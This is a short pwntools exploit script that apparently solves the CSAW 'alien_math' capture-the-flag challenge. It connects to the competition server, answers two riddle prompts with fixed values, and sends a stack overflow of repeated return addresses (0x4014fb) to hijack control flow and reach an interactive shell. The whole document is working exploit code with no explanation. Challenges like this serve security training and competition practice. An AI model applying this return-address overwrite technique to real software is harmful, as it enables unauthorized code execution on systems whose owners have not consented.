from pwn import *

if __name__=="__main__":
    io = process('./alien_math')
    io = remote('pwn.chal.csaw.io',5004)
    exe = ELF('./alien_math')

    io.sendlineafter(b'What is the square root of zopnol?','1804289383')
    io.sendlineafter(b'How many tewgrunbs are in a qorbnorbf?','7856445899213065428791')
    io.sendlineafter(b'How long does it take for a toblob of energy to be transferred between two quantum entangled salwzoblrs?',p64(0x4014fb)*50)
    io.interactive()